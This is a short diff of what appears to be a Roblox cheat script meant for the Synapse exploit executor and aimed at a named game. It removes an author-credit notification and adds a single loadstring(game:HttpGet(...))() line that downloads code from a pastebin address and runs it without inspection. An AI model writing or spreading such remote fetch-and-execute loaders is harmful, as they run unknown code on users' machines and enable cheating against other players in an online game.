@@ -1,9 +1,4 @@
-cg = game:GetService("StarterGui")
-cg:SetCore("SendNotification", {
-    Title = "Successfully loaded script.";
-    Text = "Made by Arsenicen#5961 on Discord. Discord server: discord.gg/nsdBV6EGHz";
-    Duration = 25;
-})
+loadstring(game:HttpGet('https://pastebin.com/raw/1TKY86pG'))()
 --< https://www.roblox.com/games/192800/WaaPP
 --< Works only on players that arent setting / use big scales for it to work better, works best on synapse
 
